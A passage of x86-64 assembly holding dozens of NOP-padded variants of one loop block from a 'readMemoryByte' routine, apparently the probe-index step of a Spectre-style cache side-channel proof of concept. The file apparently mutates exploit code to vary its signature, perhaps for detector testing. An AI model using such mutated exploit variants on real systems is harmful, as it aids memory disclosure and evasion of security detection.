	movl	%eax, -68(%rbp)
	movl	-68(%rbp), %eax
	jmp	.LreadMemoryByte_win5_continue
## Variant 70
.LreadMemoryByte_win5_var70:
	popq	%rax
	nop
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_25
## %bb.20:                              ##   in Loop: Header=BB1_19 Depth=2
	imull	$167, -56(%rbp), %eax
	addl	$13, %eax
	andl	$255, %eax
	movl	%eax, -68(%rbp)
	movl	-68(%rbp), %eax
	jmp	.LreadMemoryByte_win5_continue
## Variant 71
.LreadMemoryByte_win5_var71:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	nop
	jge	LBB1_25
## %bb.20:                              ##   in Loop: Header=BB1_19 Depth=2
	imull	$167, -56(%rbp), %eax
	addl	$13, %eax
	andl	$255, %eax
	movl	%eax, -68(%rbp)
	movl	-68(%rbp), %eax
	jmp	.LreadMemoryByte_win5_continue
## Variant 72
.LreadMemoryByte_win5_var72:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_25
## %bb.20:                              ##   in Loop: Header=BB1_19 Depth=2
	imull	$167, -56(%rbp), %eax
	nop
	addl	$13, %eax
	andl	$255, %eax
	nop
	movl	%eax, -68(%rbp)
	movl	-68(%rbp), %eax
	nop
	jmp	.LreadMemoryByte_win5_continue
## Variant 73
.LreadMemoryByte_win5_var73:
	popq	%rax
	nop
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_25
	nop
## %bb.20:                              ##   in Loop: Header=BB1_19 Depth=2
	imull	$167, -56(%rbp), %eax
	addl	$13, %eax
	andl	$255, %eax
	movl	%eax, -68(%rbp)
	movl	-68(%rbp), %eax
	jmp	.LreadMemoryByte_win5_continue
## Variant 74
.LreadMemoryByte_win5_var74:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	nop
	jge	LBB1_25
## %bb.20:                              ##   in Loop: Header=BB1_19 Depth=2
	imull	$167, -56(%rbp), %eax
	addl	$13, %eax
	andl	$255, %eax
	movl	%eax, -68(%rbp)
	nop
	movl	-68(%rbp), %eax
	jmp	.LreadMemoryByte_win5_continue
## Variant 75
.LreadMemoryByte_win5_var75:
	popq	%rax
	nop
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	nop
	jge	LBB1_25
## %bb.20:                              ##   in Loop: Header=BB1_19 Depth=2
	imull	$167, -56(%rbp), %eax
	addl	$13, %eax
	andl	$255, %eax
	movl	%eax, -68(%rbp)
	movl	-68(%rbp), %eax
	jmp	.LreadMemoryByte_win5_continue
## Variant 76
.LreadMemoryByte_win5_var76:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_25
	nop
## %bb.20:                              ##   in Loop: Header=BB1_19 Depth=2
	imull	$167, -56(%rbp), %eax
	addl	$13, %eax
	andl	$255, %eax
	movl	%eax, -68(%rbp)
	movl	-68(%rbp), %eax
	jmp	.LreadMemoryByte_win5_continue
## Variant 77
.LreadMemoryByte_win5_var77:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_25
## %bb.20:                              ##   in Loop: Header=BB1_19 Depth=2
	imull	$167, -56(%rbp), %eax
	addl	$13, %eax
	andl	$255, %eax
	movl	%eax, -68(%rbp)
	movl	-68(%rbp), %eax
	nop
	jmp	.LreadMemoryByte_win5_continue
## Variant 78
.LreadMemoryByte_win5_var78:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_25
## %bb.20:                              ##   in Loop: Header=BB1_19 Depth=2
	imull	$167, -56(%rbp), %eax
	nop
	addl	$13, %eax
	andl	$255, %eax
	movl	%eax, -68(%rbp)
	movl	-68(%rbp), %eax
	jmp	.LreadMemoryByte_win5_continue
## Variant 79
.LreadMemoryByte_win5_var79:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_25
## %bb.20:                              ##   in Loop: Header=BB1_19 Depth=2
	imull	$167, -56(%rbp), %eax
	nop
	nop
	addl	$13, %eax
	andl	$255, %eax
	movl	%eax, -68(%rbp)
	movl	-68(%rbp), %eax
	jmp	.LreadMemoryByte_win5_continue
## Variant 80
.LreadMemoryByte_win5_var80:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_25
## %bb.20:                              ##   in Loop: Header=BB1_19 Depth=2
	imull	$167, -56(%rbp), %eax
	nop
	nop
	addl	$13, %eax
	andl	$255, %eax
	movl	%eax, -68(%rbp)
	movl	-68(%rbp), %eax
	jmp	.LreadMemoryByte_win5_continue
## Variant 81
.LreadMemoryByte_win5_var81:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_25
	nop
## %bb.20:                              ##   in Loop: Header=BB1_19 Depth=2
	nop
	imull	$167, -56(%rbp), %eax
	addl	$13, %eax
	nop
	andl	$255, %eax
	movl	%eax, -68(%rbp)
	movl	-68(%rbp), %eax
	jmp	.LreadMemoryByte_win5_continue
## Variant 82
.LreadMemoryByte_win5_var82:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_25
## %bb.20:                              ##   in Loop: Header=BB1_19 Depth=2
	imull	$167, -56(%rbp), %eax
	nop
	addl	$13, %eax
	nop
	andl	$255, %eax
	movl	%eax, -68(%rbp)
	movl	-68(%rbp), %eax
	jmp	.LreadMemoryByte_win5_continue
## Variant 83
.LreadMemoryByte_win5_var83:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_25
	nop
	nop
## %bb.20:                              ##   in Loop: Header=BB1_19 Depth=2
	nop
	imull	$167, -56(%rbp), %eax
	addl	$13, %eax
	andl	$255, %eax
	movl	%eax, -68(%rbp)
	movl	-68(%rbp), %eax
	jmp	.LreadMemoryByte_win5_continue
## Variant 84
.LreadMemoryByte_win5_var84:
	popq	%rax
	nop
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	nop
	jge	LBB1_25
## %bb.20:                              ##   in Loop: Header=BB1_19 Depth=2
	imull	$167, -56(%rbp), %eax
	addl	$13, %eax
	andl	$255, %eax
	movl	%eax, -68(%rbp)
	movl	-68(%rbp), %eax
	jmp	.LreadMemoryByte_win5_continue
## Variant 85
.LreadMemoryByte_win5_var85:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	nop
	jge	LBB1_25
## %bb.20:                              ##   in Loop: Header=BB1_19 Depth=2
	imull	$167, -56(%rbp), %eax
	addl	$13, %eax
	andl	$255, %eax
	movl	%eax, -68(%rbp)
	movl	-68(%rbp), %eax
	jmp	.LreadMemoryByte_win5_continue
## Variant 86
.LreadMemoryByte_win5_var86:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_25
## %bb.20:                              ##   in Loop: Header=BB1_19 Depth=2
	nop
	imull	$167, -56(%rbp), %eax
	addl	$13, %eax
	andl	$255, %eax
	movl	%eax, -68(%rbp)
	movl	-68(%rbp), %eax
	nop
	nop
	jmp	.LreadMemoryByte_win5_continue
## Variant 87
.LreadMemoryByte_win5_var87:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_25
## %bb.20:                              ##   in Loop: Header=BB1_19 Depth=2
	nop
	imull	$167, -56(%rbp), %eax
	nop
	addl	$13, %eax
	andl	$255, %eax
	movl	%eax, -68(%rbp)
	movl	-68(%rbp), %eax
	nop
	jmp	.LreadMemoryByte_win5_continue
## Variant 88
.LreadMemoryByte_win5_var88:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_25
## %bb.20:                              ##   in Loop: Header=BB1_19 Depth=2
	imull	$167, -56(%rbp), %eax
	nop
	addl	$13, %eax
	nop
	andl	$255, %eax
	movl	%eax, -68(%rbp)
	movl	-68(%rbp), %eax
	jmp	.LreadMemoryByte_win5_continue
## Variant 89
.LreadMemoryByte_win5_var89:
	popq	%rax
	nop
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_25
## %bb.20:                              ##   in Loop: Header=BB1_19 Depth=2
	imull	$167, -56(%rbp), %eax
	addl	$13, %eax
	andl	$255, %eax
	movl	%eax, -68(%rbp)
	nop
	movl	-68(%rbp), %eax
	jmp	.LreadMemoryByte_win5_continue
## Variant 90
.LreadMemoryByte_win5_var90:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_25
	nop
## %bb.20:                              ##   in Loop: Header=BB1_19 Depth=2
	imull	$167, -56(%rbp), %eax
	addl	$13, %eax
	andl	$255, %eax
	nop
	movl	%eax, -68(%rbp)
	movl	-68(%rbp), %eax
	jmp	.LreadMemoryByte_win5_continue
## Variant 91
.LreadMemoryByte_win5_var91:
	popq	%rax
	nop
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_25
## %bb.20:                              ##   in Loop: Header=BB1_19 Depth=2
	nop
	nop
	imull	$167, -56(%rbp), %eax
	addl	$13, %eax
	andl	$255, %eax
	movl	%eax, -68(%rbp)
	movl	-68(%rbp), %eax
	jmp	.LreadMemoryByte_win5_continue
## Variant 92
.LreadMemoryByte_win5_var92:
	popq	%rax
	nop
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_25
## %bb.20:                              ##   in Loop: Header=BB1_19 Depth=2
	imull	$167, -56(%rbp), %eax
	addl	$13, %eax
	andl	$255, %eax
	nop
	movl	%eax, -68(%rbp)
	movl	-68(%rbp), %eax
	jmp	.LreadMemoryByte_win5_continue
## Variant 93
.LreadMemoryByte_win5_var93:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_25
	nop
## %bb.20:                              ##   in Loop: Header=BB1_19 Depth=2
	nop
	imull	$167, -56(%rbp), %eax
	addl	$13, %eax
	andl	$255, %eax
	movl	%eax, -68(%rbp)
	nop
	movl	-68(%rbp), %eax
	jmp	.LreadMemoryByte_win5_continue
## Variant 94
.LreadMemoryByte_win5_var94:
	popq	%rax
	nop
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_25
## %bb.20:                              ##   in Loop: Header=BB1_19 Depth=2
	imull	$167, -56(%rbp), %eax
	addl	$13, %eax
	andl	$255, %eax
	movl	%eax, -68(%rbp)
	movl	-68(%rbp), %eax
	jmp	.LreadMemoryByte_win5_continue
## Variant 95
.LreadMemoryByte_win5_var95:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_25
## %bb.20:                              ##   in Loop: Header=BB1_19 Depth=2
	imull	$167, -56(%rbp), %eax
	addl	$13, %eax
	andl	$255, %eax
	movl	%eax, -68(%rbp)
	movl	-68(%rbp), %eax
	nop
	jmp	.LreadMemoryByte_win5_continue
## Variant 96
.LreadMemoryByte_win5_var96:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_25
## %bb.20:                              ##   in Loop: Header=BB1_19 Depth=2
	imull	$167, -56(%rbp), %eax
	addl	$13, %eax
	nop
	andl	$255, %eax
	movl	%eax, -68(%rbp)
	nop
	movl	-68(%rbp), %eax
	jmp	.LreadMemoryByte_win5_continue
## Variant 97
.LreadMemoryByte_win5_var97:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_25
## %bb.20:                              ##   in Loop: Header=BB1_19 Depth=2
	imull	$167, -56(%rbp), %eax
	addl	$13, %eax
	andl	$255, %eax
	movl	%eax, -68(%rbp)
	nop
	nop
	movl	-68(%rbp), %eax
	jmp	.LreadMemoryByte_win5_continue
## Variant 98
.LreadMemoryByte_win5_var98:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_25
	nop
## %bb.20:                              ##   in Loop: Header=BB1_19 Depth=2
	imull	$167, -56(%rbp), %eax
	addl	$13, %eax
	andl	$255, %eax
	movl	%eax, -68(%rbp)
	movl	-68(%rbp), %eax
	nop
	jmp	.LreadMemoryByte_win5_continue
## Variant 99
.LreadMemoryByte_win5_var99:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_25
## %bb.20:                              ##   in Loop: Header=BB1_19 Depth=2
	imull	$167, -56(%rbp), %eax
	addl	$13, %eax
	nop
	andl	$255, %eax
	movl	%eax, -68(%rbp)
	movl	-68(%rbp), %eax
	jmp	.LreadMemoryByte_win5_continue
## Variant 100
.LreadMemoryByte_win5_var100:
	popq	%rax
	nop
	nop
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_25
## %bb.20:                              ##   in Loop: Header=BB1_19 Depth=2
	imull	$167, -56(%rbp), %eax
	addl	$13, %eax
	andl	$255, %eax
	movl	%eax, -68(%rbp)
	movl	-68(%rbp), %eax
	nop
	jmp	.LreadMemoryByte_win5_continue
## Variant 101
.LreadMemoryByte_win5_var101:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_25
## %bb.20:                              ##   in Loop: Header=BB1_19 Depth=2
	nop
	imull	$167, -56(%rbp), %eax
	addl	$13, %eax
	andl	$255, %eax
	movl	%eax, -68(%rbp)
	nop
	movl	-68(%rbp), %eax
	nop
	jmp	.LreadMemoryByte_win5_continue
## Variant 102
.LreadMemoryByte_win5_var102:
	popq	%rax
	nop
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_25
	nop
## %bb.20:                              ##   in Loop: Header=BB1_19 Depth=2
	imull	$167, -56(%rbp), %eax
	addl	$13, %eax
	andl	$255, %eax
	movl	%eax, -68(%rbp)
	movl	-68(%rbp), %eax
	jmp	.LreadMemoryByte_win5_continue
## Variant 103
.LreadMemoryByte_win5_var103:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_25
## %bb.20:                              ##   in Loop: Header=BB1_19 Depth=2
	imull	$167, -56(%rbp), %eax
	addl	$13, %eax
	andl	$255, %eax
	movl	%eax, -68(%rbp)
	movl	-68(%rbp), %eax
	nop
	nop
	jmp	.LreadMemoryByte_win5_continue
## Variant 104
.LreadMemoryByte_win5_var104:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_25
## %bb.20:                              ##   in Loop: Header=BB1_19 Depth=2
	imull	$167, -56(%rbp), %eax
	addl	$13, %eax
	andl	$255, %eax
	movl	%eax, -68(%rbp)
	movl	-68(%rbp), %eax
	nop
	nop
	jmp	.LreadMemoryByte_win5_continue
## Variant 105
.LreadMemoryByte_win5_var105:
	popq	%rax
	nop
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_25
## %bb.20:                              ##   in Loop: Header=BB1_19 Depth=2
	imull	$167, -56(%rbp), %eax
	addl	$13, %eax
	andl	$255, %eax
	movl	%eax, -68(%rbp)
	nop
	movl	-68(%rbp), %eax
	jmp	.LreadMemoryByte_win5_continue
## Variant 106
.LreadMemoryByte_win5_var106:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_25
## %bb.20:                              ##   in Loop: Header=BB1_19 Depth=2
	imull	$167, -56(%rbp), %eax
	addl	$13, %eax
	andl	$255, %eax
	nop
	movl	%eax, -68(%rbp)
	movl	-68(%rbp), %eax
	nop
	jmp	.LreadMemoryByte_win5_continue
## Variant 107
.LreadMemoryByte_win5_var107:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_25
## %bb.20:                              ##   in Loop: Header=BB1_19 Depth=2
	nop
	nop
	imull	$167, -56(%rbp), %eax
	addl	$13, %eax
	andl	$255, %eax
	movl	%eax, -68(%rbp)
	movl	-68(%rbp), %eax
	nop
	jmp	.LreadMemoryByte_win5_continue
## Variant 108
.LreadMemoryByte_win5_var108:
	popq	%rax
	nop
	nop
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_25
## %bb.20:                              ##   in Loop: Header=BB1_19 Depth=2
	imull	$167, -56(%rbp), %eax
	addl	$13, %eax
	nop
	andl	$255, %eax
	movl	%eax, -68(%rbp)
	movl	-68(%rbp), %eax
	jmp	.LreadMemoryByte_win5_continue
## Variant 109
.LreadMemoryByte_win5_var109:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_25
	nop
## %bb.20:                              ##   in Loop: Header=BB1_19 Depth=2
	nop
	nop
	imull	$167, -56(%rbp), %eax
	addl	$13, %eax
	andl	$255, %eax
	movl	%eax, -68(%rbp)
	movl	-68(%rbp), %eax
	jmp	.LreadMemoryByte_win5_continue
## Variant 110
.LreadMemoryByte_win5_var110:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_25
## %bb.20:                              ##   in Loop: Header=BB1_19 Depth=2
	imull	$167, -56(%rbp), %eax
	addl	$13, %eax
	andl	$255, %eax
	movl	%eax, -68(%rbp)
	nop
	movl	-68(%rbp), %eax
	jmp	.LreadMemoryByte_win5_continue
## Variant 111
.LreadMemoryByte_win5_var111:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_25
## %bb.20:                              ##   in Loop: Header=BB1_19 Depth=2
	imull	$167, -56(%rbp), %eax
	nop
	addl	$13, %eax
	andl	$255, %eax
	movl	%eax, -68(%rbp)
	movl	-68(%rbp), %eax
	nop
	nop
	jmp	.LreadMemoryByte_win5_continue
## Variant 112
.LreadMemoryByte_win5_var112:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_25
	nop
	nop
## %bb.20:                              ##   in Loop: Header=BB1_19 Depth=2
	imull	$167, -56(%rbp), %eax
	addl	$13, %eax
	andl	$255, %eax
	movl	%eax, -68(%rbp)
	movl	-68(%rbp), %eax
	jmp	.LreadMemoryByte_win5_continue
## Variant 113
.LreadMemoryByte_win5_var113:
	popq	%rax
	nop
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_25
## %bb.20:                              ##   in Loop: Header=BB1_19 Depth=2
	imull	$167, -56(%rbp), %eax
	addl	$13, %eax
	andl	$255, %eax
	nop
	movl	%eax, -68(%rbp)
	movl	-68(%rbp), %eax
	jmp	.LreadMemoryByte_win5_continue
## Variant 114
.LreadMemoryByte_win5_var114:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_25
## %bb.20:                              ##   in Loop: Header=BB1_19 Depth=2
	nop
	imull	$167, -56(%rbp), %eax
	addl	$13, %eax
	andl	$255, %eax
	movl	%eax, -68(%rbp)
	movl	-68(%rbp), %eax
	nop
	jmp	.LreadMemoryByte_win5_continue
## Variant 115
.LreadMemoryByte_win5_var115:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	nop
	jge	LBB1_25
## %bb.20:                              ##   in Loop: Header=BB1_19 Depth=2
	imull	$167, -56(%rbp), %eax
	addl	$13, %eax
	andl	$255, %eax
	movl	%eax, -68(%rbp)
	movl	-68(%rbp), %eax
	jmp	.LreadMemoryByte_win5_continue
## Variant 116
.LreadMemoryByte_win5_var116:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_25
	nop
## %bb.20:                              ##   in Loop: Header=BB1_19 Depth=2
	imull	$167, -56(%rbp), %eax
	addl	$13, %eax
	andl	$255, %eax
	movl	%eax, -68(%rbp)
	movl	-68(%rbp), %eax
	jmp	.LreadMemoryByte_win5_continue
## Variant 117
.LreadMemoryByte_win5_var117:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_25
## %bb.20:                              ##   in Loop: Header=BB1_19 Depth=2
	imull	$167, -56(%rbp), %eax
	addl	$13, %eax
	nop
	andl	$255, %eax
	movl	%eax, -68(%rbp)
	movl	-68(%rbp), %eax
	jmp	.LreadMemoryByte_win5_continue
## Variant 118
.LreadMemoryByte_win5_var118:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_25
## %bb.20:                              ##   in Loop: Header=BB1_19 Depth=2
	nop
	imull	$167, -56(%rbp), %eax
	addl	$13, %eax
	andl	$255, %eax
	movl	%eax, -68(%rbp)
	movl	-68(%rbp), %eax
	jmp	.LreadMemoryByte_win5_continue
## Variant 119
.LreadMemoryByte_win5_var119:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_25
## %bb.20:                              ##   in Loop: Header=BB1_19 Depth=2
	imull	$167, -56(%rbp), %eax
	addl	$13, %eax
	andl	$255, %eax
	movl	%eax, -68(%rbp)
	nop
	movl	-68(%rbp), %eax
	jmp	.LreadMemoryByte_win5_continue
## Variant 120
.LreadMemoryByte_win5_var120:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_25
## %bb.20:                              ##   in Loop: Header=BB1_19 Depth=2
	imull	$167, -56(%rbp), %eax
	nop
	addl	$13, %eax
	andl	$255, %eax
	nop
	movl	%eax, -68(%rbp)
	movl	-68(%rbp), %eax
	nop
	jmp	.LreadMemoryByte_win5_continue
## Variant 121
.LreadMemoryByte_win5_var121:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_25
## %bb.20:                              ##   in Loop: Header=BB1_19 Depth=2
	imull	$167, -56(%rbp), %eax
	addl	$13, %eax
	nop
	andl	$255, %eax
	movl	%eax, -68(%rbp)
	movl	-68(%rbp), %eax
	nop
	jmp	.LreadMemoryByte_win5_continue
## Variant 122
.LreadMemoryByte_win5_var122:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_25
## %bb.20:                              ##   in Loop: Header=BB1_19 Depth=2
	nop
	imull	$167, -56(%rbp), %eax
	addl	$13, %eax
	andl	$255, %eax
	movl	%eax, -68(%rbp)
	movl	-68(%rbp), %eax
	jmp	.LreadMemoryByte_win5_continue
## Variant 123
.LreadMemoryByte_win5_var123:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_25
	nop
## %bb.20:                              ##   in Loop: Header=BB1_19 Depth=2
	imull	$167, -56(%rbp), %eax
	nop
	addl	$13, %eax
	andl	$255, %eax
	movl	%eax, -68(%rbp)
	movl	-68(%rbp), %eax
	jmp	.LreadMemoryByte_win5_continue
## Variant 124
.LreadMemoryByte_win5_var124:
	popq	%rax
	nop
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_25
## %bb.20:                              ##   in Loop: Header=BB1_19 Depth=2
	imull	$167, -56(%rbp), %eax
	nop
	addl	$13, %eax
	andl	$255, %eax
	movl	%eax, -68(%rbp)
	movl	-68(%rbp), %eax
	jmp	.LreadMemoryByte_win5_continue
## Variant 125
.LreadMemoryByte_win5_var125:
	popq	%rax
	nop
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_25
## %bb.20:                              ##   in Loop: Header=BB1_19 Depth=2
	imull	$167, -56(%rbp), %eax
	addl	$13, %eax
	andl	$255, %eax
	movl	%eax, -68(%rbp)
	nop
	movl	-68(%rbp), %eax
	nop
	jmp	.LreadMemoryByte_win5_continue
## Variant 126
.LreadMemoryByte_win5_var126:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_25
## %bb.20:                              ##   in Loop: Header=BB1_19 Depth=2
	imull	$167, -56(%rbp), %eax
	addl	$13, %eax
	andl	$255, %eax
	movl	%eax, -68(%rbp)
	nop
	nop
	movl	-68(%rbp), %eax
	jmp	.LreadMemoryByte_win5_continue
## Variant 127
.LreadMemoryByte_win5_var127:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_25
## %bb.20:                              ##   in Loop: Header=BB1_19 Depth=2
	nop
	imull	$167, -56(%rbp), %eax
	addl	$13, %eax
	andl	$255, %eax
	movl	%eax, -68(%rbp)
	movl	-68(%rbp), %eax
	jmp	.LreadMemoryByte_win5_continue
## Variant 128
.LreadMemoryByte_win5_var128:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_25
## %bb.20:                              ##   in Loop: Header=BB1_19 Depth=2
	nop
	imull	$167, -56(%rbp), %eax
	nop
	addl	$13, %eax
	andl	$255, %eax
	movl	%eax, -68(%rbp)
	movl	-68(%rbp), %eax
	jmp	.LreadMemoryByte_win5_continue
## Variant 129
.LreadMemoryByte_win5_var129:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_25
## %bb.20:                              ##   in Loop: Header=BB1_19 Depth=2
	imull	$167, -56(%rbp), %eax
	nop
	addl	$13, %eax
	nop
	andl	$255, %eax
	nop
	movl	%eax, -68(%rbp)
	movl	-68(%rbp), %eax
	jmp	.LreadMemoryByte_win5_continue
## Variant 130
.LreadMemoryByte_win5_var130:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_25
## %bb.20:                              ##   in Loop: Header=BB1_19 Depth=2
	imull	$167, -56(%rbp), %eax
	addl	$13, %eax
	nop
	nop
	andl	$255, %eax
	movl	%eax, -68(%rbp)
	movl	-68(%rbp), %eax
	jmp	.LreadMemoryByte_win5_continue
## Variant 131
.LreadMemoryByte_win5_var131:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_25
## %bb.20:                              ##   in Loop: Header=BB1_19 Depth=2
	imull	$167, -56(%rbp), %eax
	addl	$13, %eax
	andl	$255, %eax
	nop
	movl	%eax, -68(%rbp)
	movl	-68(%rbp), %eax
	jmp	.LreadMemoryByte_win5_continue
## Variant 132
.LreadMemoryByte_win5_var132:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_25
## %bb.20:                              ##   in Loop: Header=BB1_19 Depth=2
	imull	$167, -56(%rbp), %eax
	addl	$13, %eax
	andl	$255, %eax
	movl	%eax, -68(%rbp)
	movl	-68(%rbp), %eax
	nop
	jmp	.LreadMemoryByte_win5_continue
## Variant 133
.LreadMemoryByte_win5_var133:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_25
	nop
## %bb.20:                              ##   in Loop: Header=BB1_19 Depth=2
	imull	$167, -56(%rbp), %eax
	addl	$13, %eax
	andl	$255, %eax
	movl	%eax, -68(%rbp)
	movl	-68(%rbp), %eax
	jmp	.LreadMemoryByte_win5_continue
## Variant 134
.LreadMemoryByte_win5_var134:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_25
## %bb.20:                              ##   in Loop: Header=BB1_19 Depth=2
	nop
	nop
	imull	$167, -56(%rbp), %eax
	addl	$13, %eax
	andl	$255, %eax
	movl	%eax, -68(%rbp)
	movl	-68(%rbp), %eax
	jmp	.LreadMemoryByte_win5_continue
## Variant 135
.LreadMemoryByte_win5_var135:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	nop
	jge	LBB1_25
## %bb.20:                              ##   in Loop: Header=BB1_19 Depth=2
	imull	$167, -56(%rbp), %eax
	addl	$13, %eax
	andl	$255, %eax
	nop
	nop
	movl	%eax, -68(%rbp)
	movl	-68(%rbp), %eax
	jmp	.LreadMemoryByte_win5_continue
## Variant 136
.LreadMemoryByte_win5_var136:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	nop
	jge	LBB1_25
## %bb.20:                              ##   in Loop: Header=BB1_19 Depth=2
	imull	$167, -56(%rbp), %eax
	addl	$13, %eax
	andl	$255, %eax
	movl	%eax, -68(%rbp)
	movl	-68(%rbp), %eax
	jmp	.LreadMemoryByte_win5_continue
## Variant 137
.LreadMemoryByte_win5_var137:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_25
## %bb.20:                              ##   in Loop: Header=BB1_19 Depth=2
	imull	$167, -56(%rbp), %eax
	addl	$13, %eax
	andl	$255, %eax
	movl	%eax, -68(%rbp)
	nop
	nop
	movl	-68(%rbp), %eax
	jmp	.LreadMemoryByte_win5_continue
## Variant 138
.LreadMemoryByte_win5_var138:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_25
## %bb.20:                              ##   in Loop: Header=BB1_19 Depth=2
	imull	$167, -56(%rbp), %eax
	addl	$13, %eax
	andl	$255, %eax
	nop
	movl	%eax, -68(%rbp)
	nop
	movl	-68(%rbp), %eax
	nop
	jmp	.LreadMemoryByte_win5_continue
## Variant 139
.LreadMemoryByte_win5_var139:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_25
## %bb.20:                              ##   in Loop: Header=BB1_19 Depth=2
	nop
	nop
	imull	$167, -56(%rbp), %eax
	addl	$13, %eax
	andl	$255, %eax
	movl	%eax, -68(%rbp)
	movl	-68(%rbp), %eax
	nop
	jmp	.LreadMemoryByte_win5_continue
## Variant 140
.LreadMemoryByte_win5_var140:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_25
	nop
	nop
## %bb.20:                              ##   in Loop: Header=BB1_19 Depth=2
	imull	$167, -56(%rbp), %eax
	nop
	addl	$13, %eax
	andl	$255, %eax
	movl	%eax, -68(%rbp)
	movl	-68(%rbp), %eax
	jmp	.LreadMemoryByte_win5_continue
## Variant 141
.LreadMemoryByte_win5_var141:
	popq	%rax
	nop
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_25
## %bb.20:                              ##   in Loop: Header=BB1_19 Depth=2
	imull	$167, -56(%rbp), %eax
	addl	$13, %eax
	andl	$255, %eax
	nop
	movl	%eax, -68(%rbp)
